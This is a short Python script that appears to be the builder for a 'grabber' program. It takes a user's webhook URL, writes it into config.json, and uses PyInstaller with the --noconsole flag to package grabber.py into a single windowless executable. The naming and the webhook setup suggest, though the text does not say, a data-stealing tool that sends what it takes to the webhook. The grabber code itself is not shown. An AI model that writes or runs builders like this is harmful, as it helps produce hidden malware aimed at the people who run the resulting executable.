import os
import json
import subprocess

def update_webhook_in_config(webhook_url):
    config_data = {
        "webhook_url": webhook_url
    }
    
    if not os.path.exists("config.json"):
        print("Error: config.json file not found.")
        return False
    
    with open("config.json", "w") as config_file:
        json.dump(config_data, config_file, indent=4)
    print("Webhook URL updated in config.json successfully.")
    return True

def build_executable():
    try:
        print("Building executable...")
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--add-data", "config.json;.", "grabber.py"], check=True)
        print("Executable created successfully!")
    except subprocess.CalledProcessError as e:
        print(f"Error during executable build: {e}")
        return False
    return True

def main():
    webhook_url = input("Please enter your custom webhook URL: ")
    
    if not update_webhook_in_config(webhook_url):
        return
    
    if not build_executable():
        return

    print("Process complete! Your executable is ready in the 'dist' folder.")

if __name__ == "__main__":
    main()
